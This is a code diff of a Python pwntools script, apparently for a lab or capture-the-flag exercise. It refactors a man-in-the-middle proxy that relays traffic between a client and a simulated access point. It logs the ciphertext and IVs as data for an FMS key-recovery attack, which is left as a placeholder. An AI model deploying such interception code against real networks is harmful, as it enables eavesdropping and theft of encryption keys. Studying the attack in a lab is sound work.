@@ -1,5 +1,4 @@
 import socket
-import threading
 from pwn import *
 
 
@@ -81,50 +80,47 @@ class Utils:
         self.client = hosts["client"]
         self.data = []
     
-    # forward traffic to correct destination - log iv and ct
-    def forward(self, source, destination, direction):
-        for _ in range(5):
-            ct = source.recv(1024)
-            self.data.extend(ct)
-            destination.send(ct)
-            ct_response = destination.recv(1024)
-            self.data.extend(ct_response)
-            source.send(ct_response)
 
     # connect to the access point and receive welcome banner
     def connect_to_ap(self, client_sock):
-        self.ap_sock.connect((self.ap[0], self.ap[1]))
+        # make a socket to connect to the AP
+        ap_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ap_sock.connect((self.ap[0], self.ap[1]))
         client_sock.send(self.ap_sock.recv(1024))
+
+        return ap_sock
+
 
     # target function for the thread(s) that handles a connection
     def handle_connection(self, client_sock, addr):
-        print(f"[+] Thread started, handling {addr}")
-    
-        # sending data to the access point from client
-        if self.client[0] in addr:
-            ap_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ap_sock.connect((self.ap[0], self.ap[1]))
-            # send the welcome banner
-            client_sock.send(ap_sock.recv(1024))
+        log.info(f"Handling connection from client: {addr}")
+        ap_sock = self.connect_to_ap(client_sock)
 
-            # threads for bidirectional forwarding
-            threading.Thread(target=self.forward, args=(client_sock, ap_sock, "to_ap")).start()
-            threading.Thread(target=self.forward, args=(ap_sock, client_sock, "to_client")).start()
+        # now we are ready to intercept back and forth messaging
+        for _ in range(5):
+            client_msg = client_sock.recv(1024)
+            ap_sock.send(client_msg)
+            ap_msg = ap_sock.recv(1024)
+            client_sock.send(ap_msg)
+            # log the data
+            self.data.append(client_msg)
+            self.data.append(ap_msg)
         
 
     # start the proxy socket
     def start_proxy(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((self.proxy[0], self.proxy[1]))
-        # we need to accept 2 connections, one from client, one from access point
-        s.listen(2)
+        # we need to accept only 1 connection, from client to MITM
+        s.listen(1)
 
-        # accept connections
-        while True:
-            accepted_sock, addr = s.accept()
-            connection_thread = threading.Thread(target=self.handle_connection, args=(accepted_sock, addr)) 
-            connection_thread.join()
-            print(self.data)
+        # accept connection
+        client_sock, addr = s.accept()
+        # populate the dataset by intercepting ciphertext and IVs
+        self.handle_connection(client_sock, addr)
+
+        # perform the FMS attack here once the dataset is populated
+        print(self.data)
 
 
 # main function
